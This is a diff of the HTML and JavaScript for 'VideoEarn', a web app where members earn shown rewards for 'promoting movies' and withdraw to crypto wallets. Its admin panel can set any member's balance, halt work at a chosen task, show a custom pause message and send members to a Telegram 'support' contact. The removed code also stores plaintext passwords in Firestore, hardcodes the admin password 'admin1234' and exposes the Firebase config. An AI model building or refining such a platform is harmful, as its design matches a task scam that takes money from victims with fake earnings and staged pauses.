@@ -6,7 +6,7 @@
   <title>VideoEarn Platform</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800;900&display=swap" rel="stylesheet">
   <style>
     :root {
       --bg: #0d0f12;
@@ -15,213 +15,114 @@
       --primary: #ccff00;
       --primary-hover: #b3e600;
       --text: #ffffff;
-      --text-muted: #94a3b8;
-      --success: #22c55e;
+      --muted: #94a3b8;
       --warning: #f59e0b;
       --telegram: #0088cc;
+      --telegram-hover: #0077b3;
+      --danger: #dc2626;
     }
-
     * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Plus Jakarta Sans', sans-serif; }
-    body { 
-      background-color: var(--bg); 
-      color: var(--text); 
-      padding: 16px; 
-      min-height: 100vh; 
-      display: flex; 
-      flex-direction: column; 
-      align-items: center; 
-      background-image: linear-gradient(to bottom, rgba(13,15,18,0.85), #0d0f12), radial-gradient(circle at top, rgba(204,255,0,0.08), transparent 60%);
-    }
-
-    .container { width: 100%; max-width: 500px; display: flex; flex-direction: column; gap: 16px; }
-
-    header { display: flex; justify-content: space-between; align-items: center; padding: 12px 0; border-bottom: 1px solid var(--border); }
-    .logo { font-size: 1.5rem; font-weight: 900; color: #ffffff; display: flex; align-items: center; gap: 8px; }
-    .logo-badge { background: var(--primary); color: #000; font-size: 0.9rem; font-weight: 800; padding: 2px 8px; border-radius: 6px; }
-    
-    .nav-btn { 
-      background: rgba(204, 255, 0, 0.1); 
-      border: 1px solid var(--primary); 
-      color: var(--primary); 
-      padding: 8px 14px; 
-      border-radius: 20px; 
-      cursor: pointer; 
-      font-size: 0.85rem; 
-      font-weight: 700; 
-      transition: all 0.2s;
-    }
+    body { background-color: var(--bg); color: var(--text); padding: 16px; min-height: 100vh; display: flex; flex-direction: column; align-items: center; }
+    .container { width: 100%; max-width: 480px; display: flex; flex-direction: column; gap: 16px; }
+    header { display: flex; justify-content: space-between; align-items: center; padding: 10px 0; border-bottom: 1px solid var(--border); }
+    .logo { font-size: 1.4rem; font-weight: 900; color: #fff; display: flex; align-items: center; gap: 8px; }
+    .logo-badge { background: var(--primary); color: #000; font-size: 0.85rem; font-weight: 800; padding: 2px 8px; border-radius: 6px; }
+    .nav-btn { background: rgba(204, 255, 0, 0.1); border: 1px solid var(--primary); color: var(--primary); padding: 6px 14px; border-radius: 20px; cursor: pointer; font-size: 0.85rem; font-weight: 700; }
     .nav-btn:hover { background: var(--primary); color: #000; }
-
-    .card { 
-      background: var(--card-bg); 
-      border: 1px solid var(--border); 
-      border-radius: 20px; 
-      padding: 24px; 
-      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5); 
-    }
-
-    .hero-badge {
+    .card { background: var(--card-bg); border: 1px solid var(--border); border-radius: 20px; padding: 20px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5); }
+    .hero-badge { display: inline-flex; border: 1px solid rgba(204, 255, 0, 0.3); background: rgba(204, 255, 0, 0.05); color: var(--primary); padding: 4px 12px; border-radius: 20px; font-size: 0.7rem; font-weight: 800; margin-bottom: 12px; text-transform: uppercase; }
+    h2, h3, h4 { margin-bottom: 8px; color: #fff; font-weight: 800; }
+    p { color: var(--muted); font-size: 0.88rem; margin-bottom: 14px; line-height: 1.5; }
+    .btn { width: 100%; padding: 12px; border: none; border-radius: 25px; font-weight: 800; color: #000; background: var(--primary); cursor: pointer; text-align: center; margin-top: 8px; text-decoration: none; display: inline-block; font-size: 0.95rem; }
+    .btn:hover { background: var(--primary-hover); }
+    .btn-sec { background: transparent; color: #fff; border: 1px solid var(--border); }
+    .btn-sec:hover { background: rgba(255,255,255,0.05); }
+    .btn-danger { background: var(--danger); color: #fff; }
+    
+    /* Fancy Compact Customer Service Button */
+    .btn-tg-compact {
       display: inline-flex;
       align-items: center;
-      gap: 6px;
-      border: 1px solid rgba(204, 255, 0, 0.3);
-      background: rgba(204, 255, 0, 0.05);
-      color: var(--primary);
-      padding: 6px 14px;
-      border-radius: 20px;
-      font-size: 0.75rem;
-      font-weight: 800;
-      letter-spacing: 0.5px;
-      margin-bottom: 16px;
-      text-transform: uppercase;
-    }
-
-    h2, h3, h4 { margin-bottom: 8px; color: #fff; font-weight: 800; }
-    p { color: var(--text-muted); font-size: 0.9rem; margin-bottom: 16px; line-height: 1.5; }
-
-    .btn { 
-      width: 100%; 
-      padding: 14px; 
-      border: none; 
-      border-radius: 30px; 
-      font-weight: 800; 
-      color: #000; 
-      background: var(--primary); 
-      cursor: pointer; 
-      text-align: center; 
-      margin-top: 8px; 
-      text-decoration: none; 
-      display: flex;
       justify-content: center;
-      align-items: center;
-      gap: 8px;
-      font-size: 1rem;
-      transition: transform 0.1s, background-color 0.2s;
-    }
-    .btn:hover { background: var(--primary-hover); transform: translateY(-1px); }
-    .btn-secondary { 
-      background: transparent; 
-      color: #ffffff; 
-      border: 1px solid var(--border); 
-      border-radius: 30px;
-    }
-    .btn-secondary:hover { background: rgba(255,255,255,0.05); }
-    .btn-telegram { background: var(--telegram); color: #fff; border-radius: 30px; }
-    .btn-danger { background: #dc2626; color: #fff; border-radius: 30px; }
-    .btn-danger:hover { background: #b91c1c; }
-    
-    label { display: block; font-size: 0.8rem; font-weight: 700; color: var(--text-muted); margin-bottom: 6px; text-transform: uppercase; letter-spacing: 0.5px; }
-    input, select, textarea { 
-      width: 100%; 
-      padding: 12px 14px; 
-      border-radius: 12px; 
-      border: 1px solid var(--border); 
-      background: #0b0d10; 
-      color: #fff; 
-      margin-bottom: 14px; 
-      font-size: 0.95rem; 
-    }
-    input:focus, select:focus, textarea:focus { outline: none; border-color: var(--primary); }
-
-    .featured-movies {
-      display: grid;
-      grid-template-columns: repeat(3, 1fr);
-      gap: 10px;
-      margin-top: 16px;
-    }
-    .movie-card-sm {
-      background: #0b0d10;
-      border: 1px solid var(--border);
-      border-radius: 12px;
-      overflow: hidden;
-      text-align: center;
-    }
-    .movie-card-sm img {
-      width: 100%;
-      height: 110px;
-      object-fit: cover;
-      background: #222;
-    }
-    .movie-card-sm span {
-      display: block;
-      padding: 6px 4px;
-      font-size: 0.75rem;
+      gap: 6px;
+      padding: 8px 18px;
+      background: linear-gradient(135deg, #0088cc 0%, #00a8ff 100%);
+      color: #ffffff;
+      font-size: 0.8rem;
       font-weight: 700;
-      color: #fff;
-      white-space: nowrap;
-      overflow: hidden;
-      text-overflow: ellipsis;
+      border-radius: 20px;
+      text-decoration: none;
+      box-shadow: 0 4px 12px rgba(0, 136, 204, 0.3);
+      transition: all 0.2s ease;
+      margin-top: 6px;
+      border: 1px solid rgba(255, 255, 255, 0.2);
+    }
+    .btn-tg-compact:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 16px rgba(0, 136, 204, 0.5);
+      background: linear-gradient(135deg, #0077b3 0%, #0099e6 100%);
     }
 
-    .progress-bar { background: #0b0d10; height: 10px; border-radius: 5px; overflow: hidden; margin: 12px 0; border: 1px solid var(--border); }
+    label { display: block; font-size: 0.75rem; font-weight: 700; color: var(--muted); margin-bottom: 4px; text-transform: uppercase; }
+    input, select, textarea { width: 100%; padding: 10px 12px; border-radius: 10px; border: 1px solid var(--border); background: #0b0d10; color: #fff; margin-bottom: 12px; font-size: 0.9rem; }
+    input:focus, select:focus, textarea:focus { outline: none; border-color: var(--primary); }
+    
+    .featured-movies { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin-top: 12px; }
+    .movie-card-sm { background: #0b0d10; border: 1px solid var(--border); border-radius: 10px; overflow: hidden; text-align: center; }
+    .movie-card-sm img { width: 100%; height: 110px; object-fit: cover; display: block; }
+    .movie-card-sm span { display: block; padding: 6px 4px; font-size: 0.7rem; font-weight: 700; color: #fff; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+    
+    .progress-bar { background: #0b0d10; height: 8px; border-radius: 4px; overflow: hidden; margin: 10px 0; border: 1px solid var(--border); }
     .progress-fill { background: var(--primary); height: 100%; width: 0%; transition: width 0.3s ease; }
     
-    .movie-box { border-radius: 16px; overflow: hidden; border: 1px solid var(--border); text-align: center; padding: 16px; background: #0b0d10; }
-    .movie-box img { width: 100%; max-height: 250px; object-fit: cover; border-radius: 12px; margin-bottom: 12px; }
+    .movie-box { border-radius: 14px; border: 1px solid var(--border); text-align: center; padding: 14px; background: #0b0d10; }
+    .movie-box img { width: 100%; max-height: 280px; object-fit: cover; border-radius: 10px; margin-bottom: 10px; display: block; }
     
-    .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 12px; }
-    .stat-card { background: #0b0d10; padding: 12px; border-radius: 12px; text-align: center; border: 1px solid var(--border); }
-    .stat-card span { font-size: 0.75rem; color: var(--text-muted); font-weight: 600; text-transform: uppercase; }
-    .stat-card div { font-size: 1.2rem; font-weight: 800; color: var(--primary); margin-top: 4px; }
-
-    .admin-section { border-top: 1px dashed var(--border); padding-top: 16px; margin-top: 16px; }
+    .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-bottom: 10px; }
+    .stat-card { background: #0b0d10; padding: 10px; border-radius: 10px; text-align: center; border: 1px solid var(--border); }
+    .stat-card span { font-size: 0.7rem; color: var(--muted); font-weight: 600; text-transform: uppercase; }
+    .stat-card div { font-size: 1.1rem; font-weight: 800; color: var(--primary); margin-top: 2px; }
+    
+    .admin-sec { border-top: 1px dashed var(--border); padding-top: 14px; margin-top: 14px; }
     .hidden { display: none !important; }
-    .tab-link { color: var(--primary); cursor: pointer; text-decoration: underline; font-weight: 700; }
-    
-    .user-list-box { background: #0b0d10; border: 1px solid var(--border); border-radius: 12px; padding: 10px; max-height: 200px; overflow-y: auto; margin-bottom: 12px; }
-    .user-item { display: flex; flex-direction: column; padding: 8px 0; border-bottom: 1px solid var(--border); font-size: 0.85rem; gap: 2px; }
-    .user-item-header { display: flex; justify-content: space-between; font-weight: 700; }
-    .user-item-details { font-size: 0.75rem; color: var(--text-muted); }
-
+    .link { color: var(--primary); cursor: pointer; text-decoration: underline; font-weight: 700; }
+    .user-list { background: #0b0d10; border: 1px solid var(--border); border-radius: 10px; padding: 8px; max-height: 180px; overflow-y: auto; margin-bottom: 10px; font-size: 0.8rem; }
+    .user-item { padding: 6px 0; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; }
     .modal-overlay { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0, 0, 0, 0.85); display: flex; justify-content: center; align-items: center; z-index: 1000; padding: 16px; }
-    .modal-box { background: var(--card-bg); border: 1px solid var(--primary); border-radius: 20px; padding: 24px; max-width: 380px; width: 100%; text-align: center; }
+    .modal-box { background: var(--card-bg); border: 1px solid var(--primary); border-radius: 16px; padding: 20px; max-width: 360px; width: 100%; text-align: center; }
   </style>
 </head>
 <body>
 
   <div class="container">
     <header>
-      <div class="logo">
-        <span class="logo-badge">V</span> VideoEarn
-      </div>
-      <button class="nav-btn" id="toggle-view-btn" onclick="toggleView()">Admin Login</button>
+      <div class="logo"><span class="logo-badge">V</span> VideoEarn</div>
+      <button class="nav-btn" id="toggle-view-btn" onclick="toggleView()">Admin Access</button>
     </header>
 
-    <!-- AUTHENTICATION VIEW -->
+    <!-- AUTH VIEW -->
     <div id="auth-view" class="card">
       <div id="login-box">
-        <div class="hero-badge">✨ HIGHEST PAYING PROMOTIONS — GUARANTEED</div>
-        <h2 style="font-size: 1.8rem;">Your opinion pays more at <span style="color:var(--primary)">VideoEarn.</span></h2>
-        <p>Members earn up to <strong style="color:var(--primary)">3x more per movie task</strong> than competing apps — powered by direct studio promotions.</p>
+        <div class="hero-badge">✨ HIGHEST PAYING PROMOTIONS</div>
+        <h2>Your opinion pays more at <span style="color:var(--primary)">VideoEarn.</span></h2>
+        <p>Members earn up to <strong style="color:var(--primary)">3x more per task</strong> than competing platforms.</p>
 
         <label>Email or Username</label>
-        <input type="text" id="login-identifier" placeholder="Enter Email or Username">
+        <input type="text" id="login-id" placeholder="Enter Email or Username">
         <label>Password</label>
-        <input type="password" id="login-password" placeholder="Password">
+        <input type="password" id="login-pass" placeholder="Password">
         <button class="btn" onclick="userLogin()">Start Earning Free →</button>
         
-        <!-- Showcase Movies -->
-        <div style="margin-top: 24px;">
-          <p style="font-size: 0.8rem; font-weight: 700; text-transform: uppercase; color: var(--text-muted); margin-bottom: 8px;">Featured Promotions</p>
+        <div style="margin-top: 20px;">
+          <p style="font-size: 0.75rem; font-weight: 700; text-transform: uppercase; color: var(--muted); margin-bottom: 6px;">Featured Movies</p>
           <div class="featured-movies">
-            <div class="movie-card-sm">
-              <img src="https://images.unsplash.com/photo-1536440136628-849c177e76a1?w=400" alt="Action Movie">
-              <span>Cyber Warriors</span>
-            </div>
-            <div class="movie-card-sm">
-              <img src="https://images.unsplash.com/photo-1489599849927-2ee91cede3ba?w=400" alt="Sci-Fi Movie">
-              <span>Deep Space</span>
-            </div>
-            <div class="movie-card-sm">
-              <img src="https://images.unsplash.com/photo-1517604931442-7e0c8ed2963c?w=400" alt="Drama Movie">
-              <span>The Horizon</span>
-            </div>
+            <div class="movie-card-sm"><img src="https://images.unsplash.com/photo-1536440136628-849c177e76a1?auto=format&fit=crop&w=400&q=80" alt="Cyber Warriors"><span>Cyber Warriors</span></div>
+            <div class="movie-card-sm"><img src="https://images.unsplash.com/photo-1489599849927-2ee91cede3ba?auto=format&fit=crop&w=400&q=80" alt="Deep Space"><span>Deep Space</span></div>
+            <div class="movie-card-sm"><img src="https://images.unsplash.com/photo-1517604931442-7e0c8ed2963c?auto=format&fit=crop&w=400&q=80" alt="The Horizon"><span>The Horizon</span></div>
           </div>
         </div>
 
-        <p style="margin-top: 16px; text-align: center;">
-          Don't have an account? <span class="tab-link" onclick="showAuthTab('signup')">Sign Up</span>
-        </p>
+        <p style="margin-top: 14px; text-align: center;">Don't have an account? <span class="link" onclick="toggleAuthTab(true)">Sign Up</span></p>
       </div>
 
       <div id="signup-box" class="hidden">
@@ -234,72 +135,60 @@
         <label>Password</label>
         <input type="password" id="signup-password" placeholder="Create Password">
         <button class="btn" onclick="userSignup()">Create Account →</button>
-        <p style="margin-top: 16px; text-align: center;">
-          Already have an account? <span class="tab-link" onclick="showAuthTab('login')">Log In</span>
-        </p>
+        <p style="margin-top: 14px; text-align: center;">Already have an account? <span class="link" onclick="toggleAuthTab(false)">Log In</span></p>
       </div>
     </div>
 
     <!-- WORKER VIEW -->
     <div id="worker-view" class="hidden">
       <div class="card">
-        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:16px;">
+        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:12px;">
           <h3>Dashboard</h3>
           <button class="nav-btn" onclick="userLogout()">Logout (<span id="user-display-name">User</span>)</button>
         </div>
 
         <div class="stats-grid">
-          <div class="stat-card">
-            <span>Current Set</span>
-            <div id="current-set-display">Set 1 / 3</div>
-          </div>
-          <div class="stat-card">
-            <span>Total Earnings</span>
-            <div id="worker-balance">$0.00</div>
-          </div>
+          <div class="stat-card"><span>Current Set</span><div id="current-set-display">Set 1 / 3</div></div>
+          <div class="stat-card"><span>Total Earnings</span><div id="worker-balance">$0.00</div></div>
         </div>
 
-        <div style="display: flex; justify-content: space-between; font-size: 0.85rem; font-weight: 600;">
+        <div style="display: flex; justify-content: space-between; font-size: 0.8rem; font-weight: 600;">
           <span>Progress (Set <span id="set-num-text">1</span>)</span>
           <span id="progress-text">0 / 16 Completed</span>
         </div>
-        <div class="progress-bar">
-          <div class="progress-fill" id="progress-fill"></div>
+        <div class="progress-bar"><div class="progress-fill" id="progress-fill"></div></div>
+
+        <!-- PAUSE NOTICE -->
+        <div id="completed-set-message" class="hidden" style="text-align: center; padding: 16px; background: rgba(245, 158, 11, 0.1); border: 1px solid var(--warning); border-radius: 12px; margin-top: 10px;">
+          <h4 style="color: var(--warning); margin-bottom: 6px;">⏸️ Task Notice</h4>
+          <p id="pause-reason-text" style="color: #fcd34d; margin-bottom: 10px; font-size: 0.85rem;">You have completed this set! Contact customer support to proceed.</p>
+          <a id="support-set-link" href="https://t.me/" target="_blank" class="btn-tg-compact">✈️ Contact Support</a>
         </div>
 
-        <!-- SET COMPLETED / WORK PAUSED NOTIFICATION -->
-        <div id="completed-set-message" class="hidden" style="text-align: center; padding: 20px 10px; background: rgba(245, 158, 11, 0.1); border: 1px solid var(--warning); border-radius: 12px; margin-top: 12px;">
-          <h4 style="color: var(--warning); margin-bottom: 8px;">⏸️ Task Notice</h4>
-          <p id="pause-reason-text" style="color: #fcd34d; font-weight: 500; font-size: 0.9rem; margin-bottom: 16px;">
-            You have successfully completed this set! Kindly contact customer support to proceed to the next set.
-          </p>
-          <a id="support-set-link" href="https://t.me/" target="_blank" class="btn btn-telegram">💬 Contact Support</a>
-        </div>
-
-        <div id="movie-container" class="movie-box" style="margin-top:12px;">
-          <img id="movie-img" src="https://images.unsplash.com/photo-1536440136628-849c177e76a1?w=600" alt="Promo Movie">
+        <div id="movie-container" class="movie-box" style="margin-top:10px;">
+          <img id="movie-img" src="https://images.unsplash.com/photo-1536440136628-849c177e76a1?auto=format&fit=crop&w=600&q=80" alt="Movie Promotion">
           <h4 id="movie-title">Movie Promotion #1</h4>
-          <p id="admin-comment" style="font-style: italic; color: var(--primary);">Admin Comment: Ready to promote!</p>
-          <div style="font-weight: 800; color: var(--primary); margin-bottom: 8px; font-size: 1.1rem;">Reward: <span id="movie-reward">$0.50</span></div>
+          <p id="admin-comment" style="font-style: italic; color: var(--primary);">Ready to promote!</p>
+          <div style="font-weight: 800; color: var(--primary); margin-bottom: 8px;">Reward: <span id="movie-reward">$0.50</span></div>
           <button class="btn" onclick="promoteMovie()">Promote This Movie</button>
         </div>
       </div>
 
       <div class="card">
         <h3>Withdraw Earnings</h3>
-        <p>Request withdrawal once available balance is ready.</p>
+        <p>Request withdrawal when ready.</p>
         <label>Crypto Wallet Address</label>
         <input type="text" id="withdraw-wallet-address" placeholder="e.g. USDT, BTC, ETH">
         <label>Withdrawal Amount ($)</label>
         <input type="number" id="withdraw-amount-input" placeholder="0.00" step="0.01">
-        <button class="btn btn-secondary" onclick="requestWithdrawal()">Apply for Withdrawal</button>
-        <p id="withdraw-status" style="margin-top: 8px; font-size: 0.85rem; text-align: center;"></p>
+        <button class="btn btn-sec" onclick="requestWithdrawal()">Apply for Withdrawal</button>
+        <p id="withdraw-status" style="margin-top: 8px; font-size: 0.8rem; text-align: center;"></p>
       </div>
 
       <div class="card" style="text-align: center;">
-        <h3>Need Assistance?</h3>
-        <p>Reach out to customer support on Telegram.</p>
-        <a id="telegram-support-btn" href="https://t.me/" target="_blank" class="btn btn-telegram">💬 Support on Telegram</a>
+        <h3>Need Help?</h3>
+        <p style="margin-bottom: 8px;">Reach out to our support team on Telegram.</p>
+        <a id="telegram-support-btn" href="https://t.me/" target="_blank" class="btn-tg-compact">✈️ Support Chat</a>
       </div>
     </div>
 
@@ -309,7 +198,7 @@
         <h3>Admin Access Required</h3>
         <label>Password</label>
         <input type="password" id="admin-pass-input" placeholder="Enter Admin Password">
-        <button class="btn" onclick="loginAdmin()">Login to Dashboard</button>
+        <button class="btn" onclick="loginAdmin()">Login to Panel</button>
       </div>
 
       <div id="admin-dashboard" class="hidden">
@@ -319,12 +208,12 @@
             <button class="nav-btn" onclick="logoutAdmin()">Logout</button>
           </div>
 
-          <div class="admin-section">
+          <div class="admin-sec">
             <h4>All Registered Members</h4>
-            <div id="all-users-list" class="user-list-box">Loading users...</div>
+            <div id="all-users-list" class="user-list">Loading...</div>
           </div>
 
-          <div class="admin-section">
+          <div class="admin-sec">
             <h4>Manage Member Settings</h4>
             <label>Select Member:</label>
             <select id="admin-selected-user" onchange="loadAdminUserData()"></select>
@@ -340,551 +229,30 @@
             <input type="number" id="admin-stop-work-num" min="1" max="16" value="16">
 
             <label>Custom Pause Message:</label>
-            <textarea id="admin-pause-message" rows="3" placeholder="Write pause message..."></textarea>
+            <textarea id="admin-pause-message" rows="2" placeholder="Write pause message..."></textarea>
 
-            <label>Edit Member Balance ($):</label>
+            <label>Edit Balance ($):</label>
             <input type="number" id="admin-user-balance" step="0.01">
 
-            <button class="btn btn-secondary" onclick="saveAdminUserSettings()">Update Member Settings</button>
+            <button class="btn btn-sec" onclick="saveAdminUserSettings()">Update Member Settings</button>
             <button class="btn btn-danger" style="margin-top: 8px;" onclick="clearMemberPause()">Clear Pause & Resume</button>
             <button class="btn" style="margin-top: 8px;" onclick="approveNextSet()">Approve Set & Advance</button>
           </div>
 
-          <div class="admin-section">
-            <h4>Telegram Link Settings</h4>
+          <div class="admin-sec">
+            <h4>Telegram Link</h4>
             <label>Link or Username:</label>
             <input type="text" id="admin-telegram-link" placeholder="https://t.me/">
-            <button class="btn btn-secondary" onclick="saveTelegramLink()">Save Link</button>
-          </div>
-
-          <!-- Upload Picture & Edit Settings -->
-          <div class="admin-section">
-            <h4>Upload & Edit Movie Pictures</h4>
-            <label>Select Set Number (1, 2, or 3):</label>
-            <select id="edit-set-num">
-              <option value="1">Set 1</option>
-              <option value="2">Set 2</option>
-              <option value="3">Set 3</option>
-            </select>
-
-            <label>Picture Number (1 to 16):</label>
-            <input type="number" id="edit-img-index" min="1" max="16" value="1">
-
-            <label>Upload Movie Picture:</label>
-            <input type="file" id="edit-img-file" accept="image/*">
-
-            <label>Reward Amount ($):</label>
-            <input type="number" id="edit-img-reward" value="0.50" step="0.01">
-
-            <label>Admin Comment:</label>
-            <input type="text" id="edit-img-comment" placeholder="Featured movie promo note...">
-
-            <button class="btn btn-secondary" onclick="savePictureAndSettings()">Save Picture & Details</button>
-          </div>
-
-          <!-- Withdrawal Requests -->
-          <div class="admin-section">
-            <h4>Withdrawal Requests</h4>
-            <p id="admin-withdraw-request-text">No active withdrawal request.</p>
-            <button class="btn" id="approve-withdraw-btn" style="background: var(--success); display: none; margin-top: 8px;" onclick="approveWithdrawal()">Approve Withdrawal Request</button>
+            <button class="btn btn-sec" onclick="saveTelegramLink()">Save Link</button>
           </div>
         </div>
       </div>
     </div>
   </div>
 
-  <!-- PROMOTION COMPLETED MODAL -->
+  <!-- MODAL -->
   <div id="promo-modal" class="modal-overlay hidden">
     <div class="modal-box">
-      <div style="font-size: 2.5rem; margin-bottom: 8px;">🎉</div>
+      <div style="font-size: 2rem; margin-bottom: 6px;">🎉</div>
       <h3>Task Complete!</h3>
-      <p id="modal-reward-text">You earned $0.50 for completing this movie promotion.</p>
-      <button class="btn" onclick="closeModal()">Continue</button>
-    </div>
-  </div>
-
-  <!-- FIREBASE INTEGRATION -->
-  <script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/12.16.0/firebase-app.js";
-    import { getFirestore, doc, setDoc, collection, onSnapshot, serverTimestamp } from "https://www.gstatic.com/firebasejs/12.16.0/firebase-firestore.js";
-
-    const firebaseConfig = {
-      apiKey: "AIzaSyAGKL96cuFJpEDe8PQhwtm_Zg0LA2fOBgo",
-      authDomain: "videoearn-342ba.firebaseapp.com",
-      projectId: "videoearn-342ba",
-      storageBucket: "videoearn-342ba.firebasestorage.app",
-      messagingSenderId: "702949776076",
-      appId: "1:702949776076:web:2dfef02d203ad8ae1e0069"
-    };
-
-    const app = initializeApp(firebaseConfig);
-    const db = getFirestore(app);
-
-    window.saveUserToFirebase = async function(userData) {
-      try {
-        await setDoc(doc(db, "users", userData.username), {
-          ...userData,
-          registeredAt: userData.registeredAt || serverTimestamp()
-        }, { merge: true });
-      } catch (err) {
-        console.error("Firestore Error:", err);
-      }
-    };
-
-    window.savePicturesToFirebase = async function(pictureKey, picData) {
-      try {
-        await setDoc(doc(db, "pictures", pictureKey), picData, { merge: true });
-      } catch (err) {
-        console.error("Firebase pictures save error:", err);
-      }
-    };
-
-    window.saveTelegramToFirebase = async function(link) {
-      try {
-        await setDoc(doc(db, "app_settings", "telegram"), { link: link }, { merge: true });
-      } catch (err) {
-        console.error("Firebase Telegram save error:", err);
-      }
-    };
-
-    window.listenToFirebaseData = function() {
-      onSnapshot(collection(db, "users"), (snapshot) => {
-        snapshot.forEach((doc) => {
-          window.users[doc.id] = doc.data();
-        });
-        window.saveUsers();
-        if (window.isAdminLoggedIn) window.populateAdminUsers();
-        window.renderUI();
-      });
-
-      onSnapshot(collection(db, "pictures"), (snapshot) => {
-        snapshot.forEach((doc) => {
-          window.globalPictureData[doc.id] = doc.data();
-        });
-        window.savePictures();
-        window.renderUI();
-      });
-
-      onSnapshot(doc(db, "app_settings", "telegram"), (docSnap) => {
-        if (docSnap.exists() && docSnap.data().link) {
-          window.telegramLink = docSnap.data().link;
-          localStorage.setItem('ve_telegram_link', window.telegramLink);
-          window.renderUI();
-        }
-      });
-    };
-
-    window.listenToFirebaseData();
-  </script>
-
-  <script>
-    window.users = JSON.parse(localStorage.getItem('ve_users')) || {};
-    window.globalPictureData = JSON.parse(localStorage.getItem('ve_pictures')) || {};
-    window.telegramLink = localStorage.getItem('ve_telegram_link') || 'https://t.me/';
-    let currentUser = localStorage.getItem('ve_current_user') || null;
-    window.isAdminLoggedIn = false;
-
-    window.saveUsers = function() { localStorage.setItem('ve_users', JSON.stringify(window.users)); };
-    window.savePictures = function() { localStorage.setItem('ve_pictures', JSON.stringify(window.globalPictureData)); };
-
-    function showAuthTab(tab) {
-      if (tab === 'signup') {
-        document.getElementById('login-box').classList.add('hidden');
-        document.getElementById('signup-box').classList.remove('hidden');
-      } else {
-        document.getElementById('signup-box').classList.add('hidden');
-        document.getElementById('login-box').classList.remove('hidden');
-      }
-    }
-
-    async function userSignup() {
-      const email = document.getElementById('signup-email').value.trim().toLowerCase();
-      const u = document.getElementById('signup-username').value.trim();
-      const p = document.getElementById('signup-password').value.trim();
-
-      if (!email || !u || !p) return alert('Please fill in all fields.');
-      if (window.users[u]) return alert('Username already taken.');
-
-      const newUser = {
-        username: u, email, password: p, currentSet: 1, completedInSet: 0,
-        stopLimit: 16, pauseMessage: '', isSetApproved: true, balance: 0.00,
-        withdrawalStatus: 'None', withdrawalAmount: 0, walletAddress: ''
-      };
-
-      window.users[u] = newUser;
-      window.saveUsers();
-      if (window.saveUserToFirebase) await window.saveUserToFirebase(newUser);
-
-      alert('Account created! Please log in.');
-      showAuthTab('login');
-    }
-
-    function userLogin() {
-      const id = document.getElementById('login-identifier').value.trim().toLowerCase();
-      const p = document.getElementById('login-password').value.trim();
-
-      let matched = window.users[id] ? id : Object.keys(window.users).find(u => window.users[u] && window.users[u].email === id);
-
-      if (matched && window.users[matched].password === p) {
-        currentUser = matched;
-        localStorage.setItem('ve_current_user', matched);
-        renderUI();
-      } else {
-        alert('Invalid Credentials!');
-      }
-    }
-
-    function userLogout() {
-      currentUser = null;
-      localStorage.removeItem('ve_current_user');
-      renderUI();
-    }
-
-    function toggleView() {
-      const authView = document.getElementById('auth-view');
-      const workerView = document.getElementById('worker-view');
-      const adminView = document.getElementById('admin-view');
-      const toggleBtn = document.getElementById('toggle-view-btn');
-
-      if (adminView.classList.contains('hidden')) {
-        authView.classList.add('hidden');
-        workerView.classList.add('hidden');
-        adminView.classList.remove('hidden');
-        toggleBtn.innerText = 'User Area';
-      } else {
-        adminView.classList.add('hidden');
-        toggleBtn.innerText = 'Admin Login';
-        renderUI();
-      }
-    }
-
-    function loginAdmin() {
-      if (document.getElementById('admin-pass-input').value === 'admin1234') {
-        window.isAdminLoggedIn = true;
-        document.getElementById('admin-login-card').classList.add('hidden');
-        document.getElementById('admin-dashboard').classList.remove('hidden');
-        document.getElementById('admin-telegram-link').value = window.telegramLink;
-        window.populateAdminUsers();
-        renderUI();
-      } else {
-        alert('Incorrect Admin Password!');
-      }
-    }
-
-    function logoutAdmin() {
-      window.isAdminLoggedIn = false;
-      document.getElementById('admin-login-card').classList.remove('hidden');
-      document.getElementById('admin-dashboard').classList.add('hidden');
-    }
-
-    async function saveTelegramLink() {
-      const link = document.getElementById('admin-telegram-link').value.trim();
-      if (!link) return alert('Please enter a valid link.');
-      window.telegramLink = link.startsWith('http') ? link : `https://${link}`;
-      localStorage.setItem('ve_telegram_link', window.telegramLink);
-      if (window.saveTelegramToFirebase) await window.saveTelegramToFirebase(window.telegramLink);
-      renderUI();
-      alert('Telegram Link updated!');
-    }
-
-    window.populateAdminUsers = function() {
-      const select = document.getElementById('admin-selected-user');
-      const userListContainer = document.getElementById('all-users-list');
-      if (!select || !userListContainer) return;
-
-      select.innerHTML = '';
-      userListContainer.innerHTML = '';
-
-      const usernames = Object.keys(window.users);
-      if (usernames.length === 0) {
-        userListContainer.innerHTML = '<p style="font-size:0.8rem;">No registered members found yet.</p>';
-        return;
-      }
-
-      usernames.forEach(u => {
-        const option = document.createElement('option');
-        option.value = u;
-        option.innerText = `${u} (${window.users[u].email || 'No email'})`;
-        select.appendChild(option);
-
-        const item = document.createElement('div');
-        item.className = 'user-item';
-        const bal = typeof window.users[u].balance === 'number' ? window.users[u].balance.toFixed(2) : '0.00';
-        item.innerHTML = `
-          <div class="user-item-header">
-            <span>${u} <small>($${bal})</small></span>
-          </div>
-          <div class="user-item-details">${window.users[u].email || 'No email'}</div>
-        `;
-        userListContainer.appendChild(item);
-      });
-
-      loadAdminUserData();
-    };
-
-    function loadAdminUserData() {
-      const select = document.getElementById('admin-selected-user');
-      if (!select) return;
-      const selectedUser = select.value;
-      if (!selectedUser || !window.users[selectedUser]) return;
-
-      const user = window.users[selectedUser];
-      document.getElementById('admin-user-balance').value = user.balance || 0;
-      document.getElementById('admin-stop-work-num').value = user.stopLimit || 16;
